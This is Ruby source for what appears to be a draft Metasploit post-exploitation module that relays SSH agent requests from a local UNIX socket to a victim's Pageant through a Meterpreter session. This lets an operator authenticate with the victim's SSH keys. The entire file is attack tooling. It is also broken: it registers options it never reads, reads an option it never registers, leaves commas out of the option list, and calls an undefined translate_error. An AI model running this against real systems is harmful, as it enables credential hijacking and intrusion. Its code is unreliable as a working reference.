##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'tmpdir'

class Metasploit3 < Msf::Post

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Forward Between Local and Remote UNIX Sockets',
                      'Description'   => %q{
                         This will forward traffic between local and remote sockets.
                       },
                      'License'       => MSF_LICENSE,
                      'Author'        => [
                        'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
                      ],
                      'Platform'      => [ 'linux' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
      [
        OptString.new('LocalSocket', [false, 'Specify a filename for the local UNIX socket.', nil])
        OptString.new('RemoteSocket', [false, 'Specify a filename for the remote UNIX socket.', nil])
        OptString.new('Direction', [false, 'Local->Remote, or Remote->Local', nil])
      ], self.class)
  end

  def run
    # Check to ensure that UNIX sockets are supported
    begin
      ::UNIXServer
    rescue NameError
      print_error("This module is only supported on a Metasploit installation that supports UNIX sockets.")
      return false
    end

    # Get the socket path from the user supplied options (or leave it blank to get the plugin to choose one)
    if datastore['SocketPath']
      @sockpath = datastore['SocketPath'].to_s
    else
      @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
    end

    # Quit if the file exists, so that we don't accidentally overwrite something important on the host system
    if ::File.exist?(@sockpath)
      print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
      return false
    end

    # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.
    ::UNIXServer.open(@sockpath) do |serv|
      print_status("Launched listening socket on #{@sockpath}")
      print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
      print_status("Now use any tool normally (e.g. ssh-add)")

      loop do
        s = serv.accept
        loop do
          socket_request_data = s.recvfrom(8192) # 8192 = AGENT_MAX
          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
          vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
          response = session.extapi.pageant.forward(socket_request_data.first, socket_request_data.first.size)
          if response[:success]
            begin
              s.send response[:blob], 0
          rescue
            break
            end
            vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')")
          else
            print_error("PageantJacker: Unsuccessful response received (#{translate_error(response[:error])})")
          end
        end
      end
    end
  end

  def cleanup
    # Remove the socket that we created, if it still exists
    ::File.delete(@sockpath) if ::File.exist?(@sockpath) if @sockpath
  end

end
